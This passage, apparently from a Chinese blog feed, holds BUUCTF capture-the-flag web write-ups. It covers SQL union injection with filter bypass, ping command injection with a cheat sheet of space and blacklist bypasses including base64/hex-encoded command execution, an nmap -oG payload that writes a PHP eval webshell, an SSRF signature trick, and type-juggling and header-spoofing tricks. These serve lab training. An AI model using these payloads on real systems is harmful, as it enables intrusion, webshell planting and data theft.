<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure>

<p>这里information_schema被过滤了 所以考虑使用</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">mysql.innodb_table_stats用于报表名</span><br><span class="line"><span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> mysql.innodb_table_stats</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(table_name)<span class="comment">/**/</span>from<span class="comment">/**/</span>mysql.innodb_table_stats),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure>
<p>得到表名</p>
<p>这里还需要用到无列名注入，之前出现过不再多介绍</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,(select<span class="comment">/**/</span>group_concat(b)<span class="comment">/**/</span>from(select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span>as<span class="comment">/**/</span>b<span class="comment">/**/</span>union<span class="comment">/**/</span>select*from<span class="comment">/**/</span>users)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,'<span class="number">22</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-GXYCTF2019Ping Ping</title>
    <url>/2020/02/10/BUUCTF-GXYCTF2019Ping-Ping/</url>
    <content><![CDATA[<h1 id="GXYCTF2019Ping-Ping"><a href="#GXYCTF2019Ping-Ping" class="headerlink" title="GXYCTF2019Ping Ping"></a>GXYCTF2019Ping Ping</h1><p>ping命令行注入<br>尝试一下</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>|ls</span><br></pre></td></tr></table></figure>
<p>发现有flag.php和index.php两个文件</p>
<p>这里记录一下linux的绕过技巧：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">linux常见绕过方法</span><br><span class="line">空格过滤</span><br><span class="line">&lt; 、&lt;&gt;、<span class="variable">%20(space)、%</span>09(tab)、<span class="keyword">$IFS$9、 IFS、&#123;IFS&#125;、IFS、IFS等</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">一些命令分隔符</span></span><br><span class="line"><span class="keyword">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">花括号的别样用法</span></span><br><span class="line"><span class="keyword">在Linux bash中还可以使用&#123;OS_COMMAND,ARGUMENT&#125;来执行系统命令</span></span><br><span class="line"><span class="keyword">&#123;cat,flag&#125;</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">黑名单绕过</span></span><br><span class="line"><span class="keyword">拼接绕过:a=l;b=s;aaab</span></span><br><span class="line"><span class="keyword">编码绕过</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">base64：</span></span><br><span class="line"><span class="keyword">echo “Y2F0IC9mbGFn”|base64-d|bash</span></span><br><span class="line"><span class="keyword">&gt;cat /flag</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">hex：</span></span><br><span class="line"><span class="keyword">echo “636174202f666c6167” | xxd -r -p|bash</span></span><br><span class="line"><span class="keyword">&gt;cat /flag</span></span><br><span class="line"><span class="keyword">oct：</span></span><br><span class="line"><span class="keyword">$</span>(printf “<span class="symbol">\1</span>54<span class="symbol">\1</span>63”)</span><br><span class="line">&gt;ls</span><br><span class="line"></span><br><span class="line">$(printf “<span class="symbol">\x</span>63<span class="symbol">\x</span>61<span class="symbol">\x</span>74<span class="symbol">\x</span>20<span class="symbol">\x</span>2f<span class="symbol">\x</span>66<span class="symbol">\x</span>6c<span class="symbol">\x</span>61<span class="symbol">\x</span>67”)</span><br><span class="line">&gt;cat /flag</span><br><span class="line"></span><br><span class="line">&#123;printf,"<span class="symbol">\x</span>63<span class="symbol">\x</span>61<span class="symbol">\x</span>74<span class="symbol">\x</span>20<span class="symbol">\x</span>2f<span class="symbol">\x</span>66<span class="symbol">\x</span>6c<span class="symbol">\x</span>61<span class="symbol">\x</span>67"&#125;|$0</span><br><span class="line">&gt;cat /flag</span><br><span class="line">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST['c']);?&gt;</span><br><span class="line">$&#123;printf,"<span class="symbol">\7</span>4<span class="symbol">\7</span>7<span class="symbol">\1</span>60<span class="symbol">\1</span>50<span class="symbol">\1</span>60<span class="symbol">\4</span>0<span class="symbol">\1</span>00<span class="symbol">\1</span>45<span class="symbol">\1</span>66<span class="symbol">\1</span>41<span class="symbol">\1</span>54<span class="symbol">\5</span>0<span class="symbol">\4</span>4<span class="symbol">\1</span>37<span class="symbol">\1</span>20<span class="symbol">\1</span>17<span class="symbol">\1</span>23<span class="symbol">\1</span>24<span class="symbol">\1</span>33<span class="symbol">\4</span>7<span class="symbol">\1</span>43<span class="symbol">\4</span>7<span class="symbol">\1</span>35<span class="symbol">\5</span>1<span class="symbol">\7</span>3<span class="symbol">\7</span>7<span class="symbol">\7</span>6"&#125;</span><br><span class="line">&gt; 1.php</span><br><span class="line">单引号和双引号绕过</span><br><span class="line">比如：ca’'t flag 或ca""t flag</span><br><span class="line">反斜杠绕过</span><br><span class="line">比如：ca<span class="symbol">\t</span> fl<span class="symbol">\a</span>g</span><br><span class="line">5、利用Shell 特殊变量绕过</span><br><span class="line">例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。</span><br><span class="line">@表示（@表示（@表示（@:同样也是获取当前shell的参数，不加引号和∗是一样的，那么加了引号如："*是一样的，那么加了引号如："∗是一样的，那么加了引号如："@" 表示将所有的参数视为不同独立的字符串，相当于"$1" "2"..）&lt;br&gt;比如：ca2"..）&lt;br&gt;比如：ca2"..）&lt;br&gt;比如：ca@t fla$@g</span><br><span class="line"></span><br><span class="line">ca$1t fla$2g</span><br></pre></td></tr></table></figure>
<p>再尝试一下</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>|cat flag.php</span><br></pre></td></tr></table></figure>
<p>发现空格被过滤了  用$IFS$9代替空格</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>|cat$IFS$9flag.php</span><br></pre></td></tr></table></figure>
<p>发现flag被过滤了  访问一下index.php  得到源码：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">|<span class="symbol">\'</span>|<span class="symbol">\"</span>|<span class="symbol">\\</span>|<span class="symbol">\(</span>|<span class="symbol">\)</span>|<span class="symbol">\[</span>|<span class="symbol">\]</span>|<span class="symbol">\&#123;</span>|<span class="symbol">\&#125;</span>/", <span class="keyword">$ip, $match))&#123;</span></span><br><span class="line"><span class="keyword">    echo preg_match</span>("/<span class="symbol">\&amp;</span>|<span class="symbol">\/</span>|<span class="symbol">\?</span>|<span class="symbol">\*</span>|<span class="symbol">\&lt;</span>|[<span class="symbol">\x</span>&#123;00&#125;-<span class="symbol">\x</span>&#123;20&#125;]|<span class="symbol">\&gt;</span>|<span class="symbol">\'</span>|<span class="symbol">\"</span>|<span class="symbol">\\</span>|<span class="symbol">\(</span>|<span class="symbol">\)</span>|<span class="symbol">\[</span>|<span class="symbol">\]</span>|<span class="symbol">\&#123;</span>|<span class="symbol">\&#125;</span>/", <span class="keyword">$ip, $match);</span></span><br><span class="line"><span class="keyword">    die</span>("fxck your symbol!");</span><br><span class="line">  &#125; else if(preg_match("/ /", <span class="keyword">$ip))&#123;</span></span><br><span class="line"><span class="keyword">    die</span>("fxck your space!");</span><br><span class="line">  &#125; else if(preg_match("/bash/", <span class="keyword">$ip))&#123;</span></span><br><span class="line"><span class="keyword">    die</span>("fxck your bash!");</span><br><span class="line">  &#125; else if(preg_match("/.*f.*l.*a.*g.*/", <span class="keyword">$ip))&#123;</span></span><br><span class="line"><span class="keyword">    die</span>("fxck your flag!");</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">$a = shell_exec</span>("ping -c 4 ".<span class="keyword">$ip);</span></span><br><span class="line"><span class="keyword">  echo "</span></span><br><span class="line"><span class="keyword">";</span></span><br><span class="line"><span class="keyword">  print_r</span>(<span class="keyword">$a);</span></span><br><span class="line"><span class="keyword">&#125;</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>过滤掉了空格，bash和flag的贪心匹配 所以想f/l/a/g这样的操作也行不通了</p>
<p>所以利用变量构造</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>;a=f;d=ag;c=l;cat$IFS$a$c$d.php</span><br></pre></td></tr></table></figure>
<p>查看源码得到flag</p>
<p>网上还有一种秒题技巧：</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>;cat$IFS$<span class="number">9</span>`ls`</span><br></pre></td></tr></table></figure>
<p>内联执行的做法 </p>
<p>官方做法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span><span class="variable">$IFS</span><span class="variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="variable">$IFS</span><span class="variable">$1</span>-d|sh</span><br></pre></td></tr></table></figure>
<p>过滤bash?那就用sh。sh的大部分脚本都可以在bash下运行</p>
<p>实在是太强了</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-2018 Online Tool</title>
    <url>/2020/02/10/BUUCTF-2018-Online-Tool/</url>
    <content><![CDATA[<h1 id="2018-Online-Tool"><a href="#2018-Online-Tool" class="headerlink" title="2018 Online Tool"></a>2018 Online Tool</h1><p>打开就是源码 审计一下 挺简单的 除了escapeshellarg和escapeshellcmd没有见过，百度了一下<br><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">https://paper.seebug.org/164/</a></p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">传入的参数是：<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>' -v -d a=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">经过escapeshellarg处理后变成了<span class="string">'172.17.0.2'</span>\<span class="string">''</span> -v -d a=<span class="number">1</span>'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line"></span><br><span class="line">经过escapeshellcmd处理后变成<span class="string">'172.17.0.2'</span>\\<span class="string">''</span> -v -d a=<span class="number">1</span>\<span class="string">'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：</span></span><br><span class="line"><span class="string">http://php.net/manual/zh/function.escapeshellcmd.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">最后执行的命令是curl '</span><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\\<span class="string">''</span> -v -d a=<span class="number">1</span>\<span class="string">'，由于中间的\\被解释为\而不再是转义字符，所以后面的'</span>没有被转义，与再后面的<span class="string">'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'</span>，即向<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>\发起请求，POST 数据为a=<span class="number">1</span>'</span><br></pre></td></tr></table></figure>
<p>最后看一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.<span class="variable">$host</span>)</span><br></pre></td></tr></table></figure>
<p>百度一下发现nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
<p>构造payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">?host=' <span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"hack"</span>]);<span class="meta">?&gt;</span></span> -oG hack.php '</span><br></pre></td></tr></table></figure>

<p>得到文件名：4061e5b4e6077706350ae44e5292f3ef<br>用菜刀连接4061e5b4e6077706350ae44e5292f3ef/hack.php<br>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-De1CTF2019 SSRF Me</title>
    <url>/2020/02/10/BUUCTF-De1CTF2019-SSRF-Me/</url>
    <content><![CDATA[<h1 id="De1CTF2019-SSRF-Me"><a href="#De1CTF2019-SSRF-Me" class="headerlink" title="De1CTF2019 SSRF Me"></a>De1CTF2019 SSRF Me</h1><p>打开之后就是源码</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name_<span class="number">_</span>)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, action, param, sign, ip)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.action = action</span><br><span class="line">        <span class="keyword">self</span>.param = param</span><br><span class="line">        <span class="keyword">self</span>.sign = sign</span><br><span class="line">        <span class="keyword">self</span>.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(<span class="keyword">self</span>.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(<span class="keyword">self</span>.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">self</span>.checkSign())<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> <span class="keyword">self</span>.<span class="symbol">action:</span></span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % <span class="keyword">self</span>.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(<span class="keyword">self</span>.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>)<span class="symbol">:</span></span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="symbol">else:</span></span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> <span class="keyword">self</span>.<span class="symbol">action:</span></span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % <span class="keyword">self</span>.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span><span class="symbol">:</span></span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(<span class="keyword">self</span>.action, <span class="keyword">self</span>.param) == <span class="keyword">self</span>.sign)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> True</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line">@app.route(<span class="string">"/geneSign"</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/De1ta'</span>,methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param))<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span></span><span class="symbol">:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="symbol">try:</span></span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[<span class="symbol">:</span><span class="number">50</span>]</span><br><span class="line">    <span class="symbol">except:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span></span><span class="symbol">:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>)<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> True</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span><span class="symbol">:</span></span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>用了python的flak框架</p>
<p>有三个路由：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="variable">@app</span>.route(<span class="string">"/geneSign"</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="variable">@app</span>.route(<span class="string">'/De1ta'</span>,methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line"><span class="variable">@app</span>.route(<span class="string">'/'</span>)</span><br><span class="line">def index():</span><br><span class="line">    return open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br></pre></td></tr></table></figure>
<p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，param=flag.txt，action 中要含有 read 和 scan，且 sign=md5(secert_key + param + action)</p>
<p>触及到盲区了  看一下WP</p>
<p>当我们访问/geneSign时，action默认为scan，而当我们通过Exec访问checkSign时，即访问getSign函数时，action为我们的cookies中的action值。</p>
<p>不妨假设 secert_key 是 xxx ，那么在开始访问 /geneSign?param=flag.txt 的时候，返回的 md5 就是 md5(‘xxx’ + ‘flag.txt’ + ‘scan’) ，在 python 里面上述表达式就相当于 md5(xxxflag.txtscan) ，这就很有意思了。</p>
<p>直接构造访问 /geneSign?param=flag.txtread ，拿到的 md5 就是 md5(‘xxx’ + ‘flag.txtread’ + ‘scan’) ，等价于 md5(‘xxxflag.txtreadscan’) ，这就达到了目标。</p>
<p>访问/geneSign?param=flag.txtread<br>得到md5</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a99fca9514e5fd8a0e324f832e37cab7</span><br></pre></td></tr></table></figure>
<p>再访问 /De1ta?param=flag.txt   并在cookie中添加 </p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">Cookie: <span class="keyword">action</span>=<span class="built_in">scan</span>;<span class="built_in">sign</span>=a99fca9514e5fd8a0e324f832e37cab7</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战2019 BuyFlag</title>
    <url>/2020/02/06/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/</url>
    <content><![CDATA[<h1 id="极客大挑战2019-BuyFlag"><a href="#极客大挑战2019-BuyFlag" class="headerlink" title="极客大挑战2019 BuyFlag"></a>极客大挑战2019 BuyFlag</h1><p>打开playing </p>
<p>得到提示 Only Cuit’s students can buy the FLAG</p>
<p>先把user改了1<br><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019BuyFlag/0.png" alt="avatar"></p>
<p>又根据下面的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要POST请求  更改请求 根据代码得知是弱口令<br>所以传参:</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">password=<span class="number">404</span>%<span class="number">20</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019BuyFlag/1.png" alt="avatar"></p>
<p>又得到提示 要买flag<br>本来想用</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">password=<span class="number">404</span>%<span class="number">20</span>&amp;<span class="section">money</span>=<span class="number">100000000</span></span><br></pre></td></tr></table></figure>
<p>但是发现超出了长度</p>
<p>所以猜测使用了strcmp</p>
<p>payload:</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">password=<span class="number">404</span>%<span class="number">20</span>&amp;<span class="section">money</span>[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战2019 Http</title>
    <url>/2020/02/06/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/</url>
    <content><![CDATA[<h1 id="极客大挑战2019-Http"><a href="#极客大挑战2019-Http" class="headerlink" title="极客大挑战2019 Http"></a>极客大挑战2019 Http</h1><p>打开之后 查看一下源码  查看文件Secret.php</p>
<p>访问一下<br><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/0.png" alt="avatar"></p>
<p>抓一下包<br>添加</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">Referer:</span> <span class="string">https:</span><span class="comment">//www.Sycsecret.com</span></span><br></pre></td></tr></table></figure>

<p>得到提示<br><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/1.png" alt="avatar"></p>
<p>再添加</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">User-Agent</span><span class="selector-pseudo">:Syclover</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/2.png" alt="avatar"></p>
<p>要求本地访问<br>再添加</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">X-Forwarded-For:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战 2019LoveSQL</title>
    <url>/2020/02/06/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019LoveSQL/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="极客大挑战 2019 LoveSQL"></a>极客大挑战 2019 LoveSQL</h1><p>打开题目  先用万能密码登录试试</p>
<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/0.png" alt="avatar"></p>
<p>用order by试试字段</p>
